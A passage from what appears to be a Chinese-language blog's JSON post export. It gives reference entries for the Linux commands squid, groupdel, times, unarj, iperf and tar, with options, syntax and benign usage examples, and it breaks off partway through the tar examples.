服务器守护进程。 补充说明 squid 命令高性能的 Web 客户端代理缓存服务器套件“squid”的服务器守护进程。 语法 squid (选项) 选项 -d：将指定调试等级的信息发送到标准错误设备； -f：使用指定的配置文件。而不使用默认配置文件； -k：向 squid 服务器发送指令； -s：启用 syslog 日志； -z：创建缓存目录； -C：不捕获致命信号； -D：不进行 DNS 参数测试； -N：以非守护进程模式运行； -X：强制进入完全调试模式。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"squid","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/squid/","stats":{"text":"1 min read","time":32000,"words":150,"minutes":1},"date":"2022-02-01 16:56:05","dateFormat":"2022-02-01"},{"content":"用于删除指定的工作组。 补充说明 groupdel 命令用于删除指定的工作组，本命令要修改的系统文件包括/ect/group 和/ect/gshadow。若该群组中仍包括某些用户，则必须先删除这些用户后，方能删除群组。 语法 groupdel (参数) 参数 组：要删除的工作组名。 实例 groupadd damon //创建 damon 工作组 groupdel damon //删除这个工作组 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"groupdel","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/groupdel/","stats":{"text":"1 min read","time":23000,"words":109,"minutes":1},"date":"2022-02-01 16:55:44","dateFormat":"2022-02-01"},{"content":"显示进程累计时间。 主要用途 打印出 shell 及其子进程累计使用的用户时间和系统时间。 返回值 总是返回成功。 例子 # 执行命令 times # 返回结果 0m0.037s 0m0.009s 0m0.010s 0m0.024s # 根据times(2)的man手册，对应关系如下： # 用户时间 | 系统时间 # 子进程的用户时间 | 子进程的系统时间 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"times","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/times/","stats":{"text":"1 min read","time":27000,"words":125,"minutes":1},"date":"2022-02-01 16:54:25","dateFormat":"2022-02-01"},{"content":"解压缩由 arj 命令创建的压缩包。 补充说明 unarj 命令用来解压缩由 arj 命令创建的压缩包。 语法 unarj (选项) (参数) 选项 e：解压缩.arj 文件； l：显示压缩文件内所包含的文件； t：检查压缩文件是否正确； x：解压缩时保留原有的路径。 参数 .arj 压缩包：指定要解压缩的.arj 压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"unarj","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/unarj/","stats":{"text":"1 min read","time":22000,"words":105,"minutes":1},"date":"2022-02-01 16:53:53","dateFormat":"2022-02-01"},{"content":"网络性能测试工具。 补充说明 iperf 命令是一个网络性能测试工具。iperf 可以测试 TCP 和 UDP 带宽质量。iperf 可以测量最大 TCP 带宽，具有多种参数和 UDP 特性。iperf 可以报告带宽，延迟抖动和数据包丢失。利用 iperf 这一特性，可以用来测试一些网络设备如路由器，防火墙，交换机等的性能。 iperf 分为两种版本，Unix/Linux 版和 Windows 版，Unix/Linux 版更新比较快，版本最新。Windows 版更新慢。Windows 版的 iperf 叫 jperf，或者 xjperf。jperf 是在 iperf 基础上开发了更好的 UI 和新的功能。 Linux版本下载地址：http://code.google.com/p/iperf/downloads/list 安装 iperf 对于 windows 版的 iperf，直接将解压出来的 iperf.exe 和 cygwin1.dll 复制到%systemroot%目录即可，对于 linux 版的 iperf，请使用如下命令安装： gunzip -c iperf-&lt;version&gt;.tar.gz | tar -xvf - cd iperf-&lt;version&gt; ./configure make make install 选项 命令行选项 描述 客户端与服务器共用选项 监测设备名称 -f, --format [bkmaBKMA] 格式化带宽数输出。支持的格式有： 'b' = bits/sec 'B' = Bytes/sec 'k' = Kbits/sec 'K' = KBytes/sec 'm' = Mbits/sec 'M' = MBytes/sec 'g' = Gbits/sec 'G' = GBytes/sec 'a' = adaptive bits/sec 'A' = adaptive Bytes/sec 自适应格式是kilo-和mega-二者之一。除了带宽之外的字段都输出为字节，除非指定输出的格式，默认的参数是a。 注意：在计算字节byte时，Kilo = 1024， Mega = 1024^2，Giga = 1024^3。通常，在网络中，Kilo = 1000， Mega = 1000^2， and Giga = 1000^3，所以，Iperf也按此来计算比特（位）。如果这些困扰了你，那么请使用-f b参数，然后亲自计算一下。 -i, --interval # 设置每次报告之间的时间间隔，单位为秒。如果设置为非零值，就会按照此时间间隔输出测试报告。默认值为零。 -l, --len #[KM] 设置读写缓冲区的长度。TCP方式默认为8KB，UDP方式默认为1470字节。 -m, --print_mss 输出TCP MSS值（通过TCP_MAXSEG支持）。MSS值一般比MTU值小40字节。通常情况 -p, --port # 设置端口，与服务器端的监听端口一致。默认是5001端口，与ttcp的一样。 -u, --udp 使用UDP方式而不是TCP方式。参看-b选项。 -w, --window #[KM] 设置套接字缓冲区为指定大小。对于TCP方式，此设置为TCP窗口大小。对于UDP方式，此设置为接受UDP数据包的缓冲区大小，限制可以接受数据包的最大值。 -B, --bind host 绑定到主机的多个地址中的一个。对于客户端来说，这个参数设置了出栈接口。对于服务器端来说，这个参数设置入栈接口。这个参数只用于具有多网络接口的主机。在Iperf的UDP模式下，此参数用于绑定和加入一个多播组。使用范围在224.0.0.0至239.255.255.255的多播地址。参考-T参数。 -C, --compatibility 与低版本的Iperf使用时，可以使用兼容模式。不需要两端同时使用兼容模式，但是强烈推荐两端同时使用兼容模式。某些情况下，使用某些数据流可以引起1.7版本的服务器端崩溃或引起非预期的连接尝试。 -M, --mss #ip头减去40字节。在以太网中，MSS值 为1460字节（MTU1500字节）。许多操作系统不支持此选项。 需求的平均队列长度 -N, --nodelay 设置TCP无延迟选项，禁用Nagle's运算法则。通常情况此选项对于交互程序，例如telnet，是禁用的。 -V (from v1.6 or higher) 绑定一个IPv6地址。 服务端：$ iperf -s –V 客户端：$ iperf -c -V 注意：在1.6.3或更高版本中，指定IPv6地址不需要使用-B参数绑定，在1.6之前的版本则需要。在大多数操作系统中，将响应IPv4客户端映射的IPv4地址。 服务器端专用选项 被I/O需求消耗的CPU百分比 -s, --server Iperf服务器模式 -D (v1.2或更高版本) Unix平台下Iperf作为后台守护进程运行。在Win32平台下，Iperf将作为服务运行。 -R(v1.2或更高版本，仅用于Windows) 卸载Iperf服务（如果它在运行）。 -o(v1.2或更高版本，仅用于Windows) 重定向输出到指定文件 -c, --client host 如果Iperf运行在服务器模式，并且用-c参数指定一个主机，那么Iperf将只接受指定主机的连接。此参数不能工作于UDP模式。 -P, --parallel # 服务器关闭之前保持的连接数。默认是0，这意味着永远接受连接。 客户端专用选项 -b, --bandwidth #[KM] UDP模式使用的带宽，单位bits/sec。此选项与-u选项相关。默认值是1 Mbit/sec。 -c, --client host 运行Iperf的客户端模式，连接到指定的Iperf服务器端。 -d, --dualtest 运行双测试模式。这将使服务器端反向连接到客户端，使用-L 参数中指定的端口（或默认使用客户端连接到服务器端的端口）。这些在操作的同时就立即完成了。如果你想要一个交互的测试，请尝试-r参数。 -n, --num #[KM] 传送的缓冲器数量。通常情况，Iperf按照10秒钟发送数据。-n参数跨越此限制，按照指定次数发送指定长度的数据，而不论该操作耗费多少时间。参考-l与-t选项。 -r, --tradeoff 往复测试模式。当客户端到服务器端的测试结束时，服务器端通过-l选项指定的端口（或默认为客户端连接到服务器端的端口），反向连接至客户端。当客户端连接终止时，反向连接随即开始。如果需要同时进行双向测试，请尝试-d参数。 -t, --time # 设置传输的总时间。Iperf在指定的时间内，重复的发送指定长度的数据包。默认是10秒钟。参考-l与-n选项。 -L, --listenport # 指定服务端反向连接到客户端时使用的端口。默认使用客户端连接至服务端的端口。 -P, --parallel # 线程数。指定客户端与服务端之间使用的线程数。默认是1线程。需要客户端与服务器端同时使用此参数。 -S, --tos # 出栈数据包的服务类型。许多路由器忽略TOS字段。你可以指定这个值，使用以&quot;0x&quot;开始的16进制数，或以&quot;0&quot;开始的8进制数或10进制数。 例如，16进制'0x10' = 8进制'020' = 十进制'16'。TOS值1349就是： IPTOS_LOWDELAY minimize delay 0x10 IPTOS_THROUGHPUT maximize throughput 0x08 IPTOS_RELIABILITY maximize reliability 0x04 IPTOS_LOWCOST minimize cost 0x02 -T, --ttl # 出栈多播数据包的TTL值。这本质上就是数据通过路由器的跳数。默认是1，链接本地。 -F (from v1.2 or higher) 使用特定的数据流测量带宽，例如指定的文件。 $ iperf -c -F -I (from v1.2 or higher) 与-F一样，由标准输入输出文件输入数据。 -h, --help 显示命令行参考并退出 。 -v, --version 显示版本信息和编译信息并退出。 实例 带宽测试通常采用 UDP 模式，因为能测出极限带宽、时延抖动、丢包率。在进行测试时，首先以链路理论带宽作为数据发送速率进行测试，例如，从客户端到服务器之间的链路的理论带宽为 100Mbps，先用-b 100M进行测试，然后根据测试结果（包括实际带宽，时延抖动和丢包率），再以实际带宽作为数据发送速率进行测试，会发现时延抖动和丢包率比第一次好很多，重复测试几次，就能得出稳定的实际带宽。 UDP 模式 服务器端： iperf -u -s 客户端： iperf -u -c 192.168.1.1 -b 100M -t 60 在 udp 模式下，以 100Mbps 为数据发送速率，客户端到服务器 192.168.1.1 上传带宽测试，测试时间为 60 秒。 iperf -u -c 192.168.1.1 -b 5M -P 30 -t 60 客户端同时向服务器端发起 30 个连接线程，以 5Mbps 为数据发送速率。 iperf -u -c 192.168.1.1 -b 100M -d -t 60 以 100M 为数据发送速率，进行上下行带宽测试。 TCP 模式 服务器端： iperf -s 客户端： iperf -c 192.168.1.1 -t 60 在 tcp 模式下，客户端到服务器 192.168.1.1 上传带宽测试，测试时间为 60 秒。 iperf -c 192.168.1.1 -P 30 -t 60 客户端同时向服务器端发起 30 个连接线程。 iperf -c 192.168.1.1 -d -t 60 进行上下行带宽测试。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iperf","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iperf/","stats":{"text":"9 min read","time":517000,"words":2225,"minutes":9},"date":"2022-02-01 16:03:59","dateFormat":"2022-02-01"},{"content":"将许多文件一起保存至一个单独的磁带或磁盘归档，并能从归档中单独还原所需文件。 补充说明 tar 命令可以为 linux 的文件和目录创建档案。利用 tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar 最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用 tar 命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。 首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件； 压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于 Linux 中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar 命令），然后再用压缩程序进行压缩（gzip bzip2 命令）。 语法 tar [选项...] [FILE]... 选项 -A, --catenate, --concatenate 追加 tar 文件至归档-c, --create 创建一个新归档-d, --diff, --compare 找出归档和文件系统的差异 --delete 从归档 (非磁带！) 中删除-r, --append 追加文件至归档结尾-t, --list 列出归档内容 --test-label 测试归档卷标并退出-u, --update 仅追加比归档中副本更新的文件-x, --extract, --get 从归档中解出文件操作修饰符: --check-device 当创建增量归档时检查设备号 (默认) -g, --listed-incremental=FILE 处理新式的 GNU 格式的增量备份 -G, --incremental 处理老式的 GNU 格式的增量备份 --ignore-failed-read 当遇上不可读文件时不要以非零值退出 --level=NUMBER 所创建的增量列表归档的输出级别 -n, --seek 归档可检索 --no-check-device 当创建增量归档时不要检查设备号 --no-seek 归档不可检索 --occurrence[=NUMBER] 仅处理归档中每个文件的第 NUMBER 个事件； 仅当与以下子命令 --delete, --diff, --extract 或是 --list 中的一个联合使用时，此选项才有效。而且不管文件列表是以命令行形式给出或是通过 -T 选项指定的； NUMBER 值默认为 1 --sparse-version=MAJOR[.MINOR] 设置所用的离散格式版本 (隐含 --sparse) -S, --sparse 高效处理离散文件 重写控制: -k, --keep-old-files don't replace existing files when extracting, treat them as errors --keep-directory-symlink preserve existing symlinks to directories when extracting --keep-newer-files 不要替换比归档中副本更新的已存在的文件 --no-overwrite-dir 保留已存在目录的元数据 --overwrite 解压时重写存在的文件 --overwrite-dir 解压时重写已存在目录的元数据 (默认) --recursive-unlink 解压目录之前先清除目录层次 --remove-files 在添加文件至归档后删除它们 --skip-old-files don't replace existing files when extracting, silently skip over them -U, --unlink-first 在解压要重写的文件之前先删除它们 -W, --verify 在写入以后尝试校验归档 选择输出流: --ignore-command-error 忽略子进程的退出代码 --no-ignore-command-error 将子进程的非零退出代码认为发生错误 -O, --to-stdout 解压文件至标准输出 --to-command=COMMAND 将解压的文件通过管道传送至另一个程序 操作文件属性: --atime-preserve[=METHOD] 在输出的文件上保留访问时间，要么通过在读取 (默认 METHOD=‘replace’) 后还原时间，要不就不要在第一次 (METHOD=‘system’) 设置时间 --delay-directory-restore 直到解压结束才设置修改时间和所解目录的权限 --group=名称 强制将 NAME 作为所添加的文件的组所有者 --mode=CHANGES 强制将所添加的文件 (符号) 更改为权限 CHANGES --mtime=DATE-OR-FILE 从 DATE-OR-FILE 中为添加的文件设置 mtime -m, --touch 不要解压文件的修改时间 --no-delay-directory-restore 取消 --delay-directory-restore 选项的效果 --no-same-owner 将文件解压为您所有 (普通用户默认此项) --no-same-permissions 从归档中解压权限时使用用户的掩码位 (默认为普通用户服务) --numeric-owner 总是以数字代表用户/组的名称 --owner=名称 强制将 NAME 作为所添加的文件的所有者 -p, --preserve-permissions, --same-permissions 解压文件权限信息 (默认只为超级用户服务) --preserve 与 -p 和 -s 一样 --same-owner 尝试解压时保持所有者关系一致 (超级用户默认此项) -s, --preserve-order, --same-order member arguments are listed in the same order as the files in the archive Handling of extended file attributes: --acls Enable the POSIX ACLs support --no-acls Disable the POSIX ACLs support --no-selinux Disable the SELinux context support --no-xattrs Disable extended attributes support --selinux Enable the SELinux context support --xattrs Enable extended attributes support --xattrs-exclude=MASK specify the exclude pattern for xattr keys --xattrs-include=MASK specify the include pattern for xattr keys 设备选择和切换: -f, --file=ARCHIVE 使用归档文件或 ARCHIVE 设备 --force-local 即使归档文件存在副本还是把它认为是本地归档 -F, --info-script=名称, --new-volume-script=名称 在每卷磁带最后运行脚本 (隐含 -M) -L, --tape-length=NUMBER 写入 NUMBER × 1024 字节后更换磁带 -M, --multi-volume 创建/列出/解压多卷归档文件 --rmt-command=COMMAND 使用指定的 rmt COMMAND 代替 rmt --rsh-command=COMMAND 使用远程 COMMAND 代替 rsh --volno-file=FILE 使用/更新 FILE 中的卷数 设备分块: -b, --blocking-factor=BLOCKS 每个记录 BLOCKS x 512 字节 -B, --read-full-records 读取时重新分块 (只对 4.2BSD 管道有效) -i, --ignore-zeros 忽略归档中的零字节块 (即文件结尾) --record-size=NUMBER 每个记录的字节数 NUMBER，乘以 512 选择归档格式: -H, --format=FORMAT 创建指定格式的归档 FORMAT 是以下格式中的一种: gnu GNU tar 1.13.x 格式 oldgnu GNU 格式 as per tar &amp;lt;= 1.12 pax POSIX 1003.1-2001 (pax) 格式 posix 等同于 pax ustar POSIX 1003.1-1988 (ustar) 格式 v7 old V7 tar 格式 --old-archive, --portability 等同于 --format=v7 --pax-option=关键字[[:]=值 ][,关键字[[:]=值 ]]... 控制 pax 关键字 --posix 等同于 --format=posix -V, --label=TEXT 创建带有卷名 TEXT 的归档； 在列出/解压时，使用 TEXT 作为卷名的模式串 压缩选项: -a, --auto-compress 使用归档后缀名来决定压缩程序 -I, --use-compress-program=PROG 通过 PROG 过滤 (必须是能接受 -d 选项的程序) -j, --bzip2 通过 bzip2 过滤归档 -J, --xz 通过 xz 过滤归档 --lzip 通过 lzip 过滤归档 --lzma 通过 lzma 过滤归档 --lzop --no-auto-compress 不使用归档后缀名来决定压缩程序 -z, --gzip, --gunzip, --ungzip 通过 gzip 过滤归档 -Z, --compress, --uncompress 通过 compress 过滤归档 本地文件选择: --add-file=FILE 添加指定的 FILE 至归档 (如果名字以 - 开始会很有用的) --backup[=CONTROL] 在删除前备份，选择 CONTROL 版本 -C, --directory=DIR 改变至目录 DIR --exclude=PATTERN 排除以 PATTERN 指定的文件 --exclude-backups 排除备份和锁文件 --exclude-caches 除标识文件本身外，排除包含 CACHEDIR.TAG 的目录中的内容 --exclude-caches-all 排除包含 CACHEDIR.TAG 的目录 --exclude-caches-under 排除包含 CACHEDIR.TAG 的目录中所有内容 --exclude-tag=FILE 除 FILE 自身外，排除包含 FILE 的目录中的内容 --exclude-tag-all=FILE 排除包含 FILE 的目录 --exclude-tag-under=FILE 排除包含 FILE 的目录中的所有内容 --exclude-vcs 排除版本控制系统目录 -h, --dereference 跟踪符号链接； 将它们所指向的文件归档并输出 --hard-dereference 跟踪硬链接； 将它们所指向的文件归档并输出 -K, --starting-file=MEMBER-NAME begin at member MEMBER-NAME when reading the archive --newer-mtime=DATE 当只有数据改变时比较数据和时间 --no-null 禁用上一次的效果 --null 选项 --no-recursion 避免目录中的自动降级 --no-unquote 不以 -T 读取的文件名作为引用结束 --null -T 读取以空终止的名字，-C 禁用 -N, --newer=DATE-OR-FILE, --after-date=DATE-OR-FILE 只保存比 DATE-OR-FILE 更新的文件 --one-file-system 创建归档时保存在本地文件系统中 -P, --absolute-names 不要从文件名中清除引导符‘/’ --recursion 目录递归 (默认) --suffix=STRING 在删除前备份，除非被环境变量 SIMPLE_BACKUP_SUFFIX 覆盖，否则覆盖常用后缀 (‘’) -T, --files-from=FILE 从 FILE 中获取文件名来解压或创建文件 --unquote 以 -T 读取的文件名作为引用结束 (默认) -X, --exclude-from=FILE 排除 FILE 中列出的模式串 文件名变换: --strip-components=NUMBER 解压时从文件名中清除 NUMBER 个引导部分 --transform=EXPRESSION, --xform=EXPRESSION 使用 sed 代替 EXPRESSION 来进行文件名变换 文件名匹配选项 (同时影响排除和包括模式串): --anchored 模式串匹配文件名头部 --ignore-case 忽略大小写 --no-anchored 模式串匹配任意‘/’后字符 (默认对 exclusion 有效) --no-ignore-case 匹配大小写 (默认) --no-wildcards 逐字匹配字符串 --no-wildcards-match-slash 通配符不匹配‘/’ --wildcards use wildcards (default) --wildcards-match-slash 通配符匹配‘/’(默认对排除操作有效) 提示性输出: --checkpoint[=NUMBER] 每隔 NUMBER 个记录显示进度信息 (默认为 10 个) --checkpoint-action=ACTION 在每个检查点上执行 ACTION --full-time print file time to its full resolution --index-file=FILE 将详细输出发送至 FILE -l, --check-links 只要不是所有链接都被输出就打印信息 --no-quote-chars=STRING 禁用来自 STRING 的字符引用 --quote-chars=STRING 来自 STRING 的额外的引用字符 --quoting-style=STYLE 设置名称引用风格； 有效的 STYLE 值请参阅以下说明 -R, --block-number 每个信息都显示归档内的块数 --show-defaults 显示 tar 默认选项 --show-omitted-dirs 列表或解压时，列出每个不匹配查找标准的目录 --show-transformed-names, --show-stored-names 显示变换后的文件名或归档名 --totals[=SIGNAL] 处理归档后打印出总字节数； 当此 SIGNAL 被触发时带参数 - 打印总字节数； 允许的信号为: SIGHUP，SIGQUIT，SIGINT，SIGUSR1 和 SIGUSR2； 同时也接受不带 SIG 前缀的信号名称 --utc 以 UTC 格式打印文件修改时间 -v, --verbose 详细地列出处理的文件 --warning=KEYWORD 警告控制: -w, --interactive, --confirmation 每次操作都要求确认 兼容性选项: -o 创建归档时，相当于 --old-archive； -A, --catenate, --concatenate 追加 tar 文件至归档 -c, --create 创建一个新归档 -d, --diff, --compare 找出归档和文件系统的差异 --delete 从归档(非磁带！)中删除 -r, --append 追加文件至归档结尾 -t, --list 列出归档内容 --test-label 测试归档卷标并退出 -u, --update 仅追加比归档中副本更新的文件 -x, --extract, --get 从归档中解出文件 操作修饰符: --check-device 当创建增量归档时检查设备号(默认) -g, --listed-incremental=FILE 处理新式的 GNU 格式的增量备份 -G, --incremental 处理老式的 GNU 格式的增量备份 --ignore-failed-read 当遇上不可读文件时不要以非零值退出 --level=NUMBER 所创建的增量列表归档的输出级别 -n, --seek 归档可检索 --no-check-device 当创建增量归档时不要检查设备号 --no-seek 归档不可检索 --occurrence[=NUMBER] 仅处理归档中每个文件的第 NUMBER 个事件；仅当与以下子命令 --delete, --diff, --extract 或是 --list 中的一个联合使用时，此选项才有效。而且不管文件列表是以命令行形式给出或是通过 -T 选项指定的；NUMBER 值默认为 1 --sparse-version=MAJOR[.MINOR] 设置所用的离散格式版本(隐含 --sparse) -S, --sparse 高效处理离散文件 重写控制: -k, --keep-old-files don't replace existing files when extracting, treat them as errors --keep-directory-symlink preserve existing symlinks to directories when extracting --keep-newer-files 不要替换比归档中副本更新的已存在的文件 --no-overwrite-dir 保留已存在目录的元数据 --overwrite 解压时重写存在的文件 --overwrite-dir 解压时重写已存在目录的元数据(默认) --recursive-unlink 解压目录之前先清除目录层次 --remove-files 在添加文件至归档后删除它们 --skip-old-files don't replace existing files when extracting, silently skip over them -U, --unlink-first 在解压要重写的文件之前先删除它们 -W, --verify 在写入以后尝试校验归档 选择输出流: --ignore-command-error 忽略子进程的退出代码 --no-ignore-command-error 将子进程的非零退出代码认为发生错误 -O, --to-stdout 解压文件至标准输出 --to-command=COMMAND 将解压的文件通过管道传送至另一个程序 操作文件属性: --atime-preserve[=METHOD] 在输出的文件上保留访问时间，要么通过在读取(默认 METHOD=‘replace’)后还原时间，要不就不要在第一次(METHOD=‘system’)设置时间 --delay-directory-restore 直到解压结束才设置修改时间和所解目录的权限 --group=名称 强制将 NAME 作为所添加的文件的组所有者 --mode=CHANGES 强制将所添加的文件(符号)更改为权限 CHANGES --mtime=DATE-OR-FILE 从 DATE-OR-FILE 中为添加的文件设置 mtime -m, --touch 不要解压文件的修改时间 --no-delay-directory-restore 取消 --delay-directory-restore 选项的效果 --no-same-owner 将文件解压为您所有(普通用户默认此项) --no-same-permissions 从归档中解压权限时使用用户的掩码位(默认为普通用户服务) --numeric-owner 总是以数字代表用户/组的名称 --owner=名称 强制将 NAME 作为所添加的文件的所有者 -p, --preserve-permissions, --same-permissions 解压文件权限信息(默认只为超级用户服务) --preserve 与 -p 和 -s 一样 --same-owner 尝试解压时保持所有者关系一致(超级用户默认此项) -s, --preserve-order, --same-order member arguments are listed in the same order as the files in the archive Handling of extended file attributes: --acls Enable the POSIX ACLs support --no-acls Disable the POSIX ACLs support --no-selinux Disable the SELinux context support --no-xattrs Disable extended attributes support --selinux Enable the SELinux context support --xattrs Enable extended attributes support --xattrs-exclude=MASK specify the exclude pattern for xattr keys --xattrs-include=MASK specify the include pattern for xattr keys 设备选择和切换: -f, --file=ARCHIVE 使用归档文件或 ARCHIVE 设备 --force-local 即使归档文件存在副本还是把它认为是本地归档 -F, --info-script=名称, --new-volume-script=名称 在每卷磁带最后运行脚本(隐含 -M) -L, --tape-length=NUMBER 写入 NUMBER × 1024 字节后更换磁带 -M, --multi-volume 创建/列出/解压多卷归档文件 --rmt-command=COMMAND 使用指定的 rmt COMMAND 代替 rmt --rsh-command=COMMAND 使用远程 COMMAND 代替 rsh --volno-file=FILE 使用/更新 FILE 中的卷数 设备分块: -b, --blocking-factor=BLOCKS 每个记录 BLOCKS x 512 字节 -B, --read-full-records 读取时重新分块(只对 4.2BSD 管道有效) -i, --ignore-zeros 忽略归档中的零字节块(即文件结尾) --record-size=NUMBER 每个记录的字节数 NUMBER，乘以 512 选择归档格式: -H, --format=FORMAT 创建指定格式的归档 FORMAT 是以下格式中的一种: gnu GNU tar 1.13.x 格式 oldgnu GNU 格式 as per tar &lt;= 1.12 pax POSIX 1003.1-2001 (pax) 格式 posix 等同于 pax ustar POSIX 1003.1-1988 (ustar) 格式 v7 old V7 tar 格式 --old-archive, --portability 等同于 --format=v7 --pax-option=关键字[[:]=值][,关键字[[:]=值]]... 控制 pax 关键字 --posix 等同于 --format=posix -V, --label=TEXT 创建带有卷名 TEXT 的归档；在列出/解压时，使用 TEXT 作为卷名的模式串 压缩选项: -a, --auto-compress 使用归档后缀名来决定压缩程序 -I, --use-compress-program=PROG 通过 PROG 过滤(必须是能接受 -d 选项的程序) -j, --bzip2 通过 bzip2 过滤归档 -J, --xz 通过 xz 过滤归档 --lzip 通过 lzip 过滤归档 --lzma 通过 lzma 过滤归档 --lzop --no-auto-compress 不使用归档后缀名来决定压缩程序 -z, --gzip, --gunzip, --ungzip 通过 gzip 过滤归档 -Z, --compress, --uncompress 通过 compress 过滤归档 本地文件选择: --add-file=FILE 添加指定的 FILE 至归档(如果名字以 - 开始会很有用的) --backup[=CONTROL] 在删除前备份，选择 CONTROL 版本 -C, --directory=DIR 改变至目录 DIR --exclude=PATTERN 排除以 PATTERN 指定的文件 --exclude-backups 排除备份和锁文件 --exclude-caches 除标识文件本身外，排除包含 CACHEDIR.TAG 的目录中的内容 --exclude-caches-all 排除包含 CACHEDIR.TAG 的目录 --exclude-caches-under 排除包含 CACHEDIR.TAG 的目录中所有内容 --exclude-tag=FILE 除 FILE 自身外，排除包含 FILE 的目录中的内容 --exclude-tag-all=FILE 排除包含 FILE 的目录 --exclude-tag-under=FILE 排除包含 FILE 的目录中的所有内容 --exclude-vcs 排除版本控制系统目录 -h, --dereference 跟踪符号链接；将它们所指向的文件归档并输出 --hard-dereference 跟踪硬链接；将它们所指向的文件归档并输出 -K, --starting-file=MEMBER-NAME begin at member MEMBER-NAME when reading the archive --newer-mtime=DATE 当只有数据改变时比较数据和时间 --no-null 禁用上一次的效果 --null 选项 --no-recursion 避免目录中的自动降级 --no-unquote 不以 -T 读取的文件名作为引用结束 --null -T 读取以空终止的名字，-C 禁用 -N, --newer=DATE-OR-FILE, --after-date=DATE-OR-FILE 只保存比 DATE-OR-FILE 更新的文件 --one-file-system 创建归档时保存在本地文件系统中 -P, --absolute-names 不要从文件名中清除引导符‘/’ --recursion 目录递归(默认) --suffix=STRING 在删除前备份，除非被环境变量 SIMPLE_BACKUP_SUFFIX 覆盖，否则覆盖常用后缀(‘’) -T, --files-from=FILE 从 FILE 中获取文件名来解压或创建文件 --unquote 以 -T 读取的文件名作为引用结束(默认) -X, --exclude-from=FILE 排除 FILE 中列出的模式串 文件名变换: --strip-components=NUMBER 解压时从文件名中清除 NUMBER 个引导部分 --transform=EXPRESSION, --xform=EXPRESSION 使用 sed 代替 EXPRESSION 来进行文件名变换 文件名匹配选项(同时影响排除和包括模式串): --anchored 模式串匹配文件名头部 --ignore-case 忽略大小写 --no-anchored 模式串匹配任意‘/’后字符(默认对 exclusion 有效) --no-ignore-case 匹配大小写(默认) --no-wildcards 逐字匹配字符串 --no-wildcards-match-slash 通配符不匹配‘/’ --wildcards use wildcards (default) --wildcards-match-slash 通配符匹配‘/’(默认对排除操作有效) 提示性输出: --checkpoint[=NUMBER] 每隔 NUMBER 个记录显示进度信息(默认为 10 个) --checkpoint-action=ACTION 在每个检查点上执行 ACTION --full-time print file time to its full resolution --index-file=FILE 将详细输出发送至 FILE -l, --check-links 只要不是所有链接都被输出就打印信息 --no-quote-chars=STRING 禁用来自 STRING 的字符引用 --quote-chars=STRING 来自 STRING 的额外的引用字符 --quoting-style=STYLE 设置名称引用风格；有效的 STYLE 值请参阅以下说明 -R, --block-number 每个信息都显示归档内的块数 --show-defaults 显示 tar 默认选项 --show-omitted-dirs 列表或解压时，列出每个不匹配查找标准的目录 --show-transformed-names, --show-stored-names 显示变换后的文件名或归档名 --totals[=SIGNAL] 处理归档后打印出总字节数；当此 SIGNAL 被触发时带参数 - 打印总字节数；允许的信号为: SIGHUP，SIGQUIT，SIGINT，SIGUSR1 和 SIGUSR2；同时也接受不带 SIG 前缀的信号名称 --utc 以 UTC 格式打印文件修改时间 -v, --verbose 详细地列出处理的文件 --warning=KEYWORD 警告控制: -w, --interactive, --confirmation 每次操作都要求确认 兼容性选项: -o 创建归档时，相当于 --old-archive；展开归档时，相当于 --no-same-owner 其它选项: -?, --help 显示此帮助列表 --restrict 禁用某些潜在的有危险的选项 --usage 显示简短的用法说明 --version 打印程序版本 长选项和相应短选项具有相同的强制参数或可选参数。 除非以 --suffix 或 SIMPLE_BACKUP_SUFFIX 设置备份后缀，否则备份后缀就是“~”。 可以用 --backup 或 VERSION_CONTROL 设置版本控制，可能的值为： none, off 从不做备份 t, numbered 进行编号备份 nil, existing 如果编号备份存在则进行编号备份，否则进行简单备份 never, simple 总是使用简单备份 --quoting-style 选项的有效参数为: literal shell shell-always c c-maybe escape locale clocale 此 tar 默认为: --format=gnu -f- -b20 --quoting-style=escape --rmt-command=/etc/rmt --rsh-command=/usr/bin/ssh 参数 文件或目录：指定要打包的文件或目录列表。 实例 - z：有gzip属性的 - j：有bz2属性的 - Z：有compress属性的 - v：显示所有过程 - O：将文件解开到标准输出 tar -cf archive.tar foo bar # 从文件 foo 和 bar 创建归档文件 archive.tar。 tar -tvf archive.tar # 详细列举归档文件 archive.tar 中的所有文件。 tar -xf archive.tar # 展开归档文件 archive.tar 中的所有文件。 下面的参数-f 是必须的 -f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。 tar -cf all.tar *.jpg # 这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。 tar -rf all.tar *.gif # 这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。 tar -uf all.tar logo.gif # 这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。 tar -tf all.tar # 这条命令是列出all.tar包中所有文件，-t是列出文件的意思 tar -cfv archive.tar foo bar # 从文件foo和bar创建archive.tar。 tar -tvf archive.tar # 详细列出archive.tar中的所有文件。 tar -xf archive.tar # 